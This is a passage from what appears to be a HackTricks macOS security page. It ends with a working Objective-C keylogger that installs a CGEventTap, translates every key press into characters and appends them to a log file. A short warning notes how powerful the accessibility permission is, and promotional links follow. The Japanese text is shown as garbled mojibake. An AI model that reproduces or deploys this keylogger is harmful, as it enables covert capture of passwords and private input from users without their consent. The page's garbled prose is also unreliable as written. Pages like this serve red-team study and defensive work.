default: break; // Not a special non-printable key
}

// If it's not a special key, try to translate it
if (!keyString) {
UniCharCount maxStringLength = 4;
UniCharCount actualStringLength = 0;
UniChar unicodeString[maxStringLength];

TISInputSourceRef currentKeyboard = TISCopyCurrentKeyboardInputSource();
CFDataRef layoutData = TISGetInputSourceProperty(currentKeyboard, kTISPropertyUnicodeKeyLayoutData);
const UCKeyboardLayout *keyboardLayout = (const UCKeyboardLayout *)CFDataGetBytePtr(layoutData);

UInt32 deadKeyState = 0;
OSStatus status = UCKeyTranslate(keyboardLayout,
keyCode,
kUCKeyActionDown,
0,
LMGetKbdType(),
kUCKeyTranslateNoDeadKeysBit,
&deadKeyState,
maxStringLength,
&actualStringLength,
unicodeString);
CFRelease(currentKeyboard);

if (status == noErr && actualStringLength > 0) {
keyString = [NSString stringWithCharacters:unicodeString length:actualStringLength];
} else {
keyString = [NSString stringWithFormat:@"<KeyCode: %d>", keyCode];
}
}

NSString *logString = [NSString stringWithFormat:@"%@\n", keyString];
AppendStringToFile(logString, kKeystrokesLogPath);
}
return event;
}

int main() {
@autoreleasepool {
CGEventMask eventMask = CGEventMaskBit(kCGEventKeyDown);
CFMachPortRef eventTap = CGEventTapCreate(kCGSessionEventTap, kCGHeadInsertEventTap, 0, eventMask, KeyboardEventCallback, NULL);

if (!eventTap) {
NSLog(@"Failed to create event tap");
exit(1);
}

CFRunLoopSourceRef runLoopSource = CFMachPortCreateRunLoopSource(kCFAllocatorDefault, eventTap, 0);
CFRunLoopAddSource(CFRunLoopGetCurrent(), runLoopSource, kCFRunLoopCommonModes);
CGEventTapEnable(eventTap, true);
CFRunLoopRun();
}
return 0;
}
```
{% endtab %}
{% endtabs %}

{% hint style="danger" %}
**ã‚¢ã‚¯ã‚»ã‚·ãƒ“ãƒªãƒ†ã‚£ã¯éå¸¸ã«å¼·åŠ›ãªæ¨©é™**ã§ã™ã€‚ãŸã¨ãˆã°ã€**ã‚­ãƒ¼ã‚¹ãƒˆãƒ­ãƒ¼ã‚¯æ”»æ’ƒ**ã‚’System Eventsã‚’å‘¼ã³å‡ºã™å¿…è¦ãªãã€ãã‚Œã ã‘ã§å®Ÿè¡Œã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
{% endhint %}

<details>

<summary><strong>htARTEï¼ˆHackTricks AWS Red Team Expertï¼‰ã§AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’ã‚¼ãƒ­ã‹ã‚‰ãƒ’ãƒ¼ãƒ­ãƒ¼ã¾ã§å­¦ã¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWS Red Team Expertï¼‰</strong></a><strong>ï¼</strong></summary>

HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹ä»–ã®æ–¹æ³•ï¼š

* **HackTricksã§ä¼æ¥­ã‚’å®£ä¼ã—ãŸã„**å ´åˆã‚„**HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰**ã—ãŸã„å ´åˆã¯ã€[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**å…¬å¼PEASSï¼†HackTricksã®ã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’å…¥æ‰‹ã™ã‚‹
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ç™ºè¦‹ã—ã€ç‹¬å çš„ãª[NFTs](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã‚’è¦‹ã¤ã‘ã‚‹
* **ğŸ’¬ [Discordã‚°ãƒ«ãƒ¼ãƒ—](https://discord.gg/hRep4RUj7f)**ã«å‚åŠ ã™ã‚‹ã‹ã€[telegramã‚°ãƒ«ãƒ¼ãƒ—](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã™ã‚‹ã€‚
* **HackTricks**ã¨[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ã€ã‚ãªãŸã®ãƒãƒƒã‚­ãƒ³ã‚°ãƒ†ã‚¯ãƒ‹ãƒƒã‚¯ã‚’å…±æœ‰ã—ã¦ãã ã•ã„ã€‚

</details>
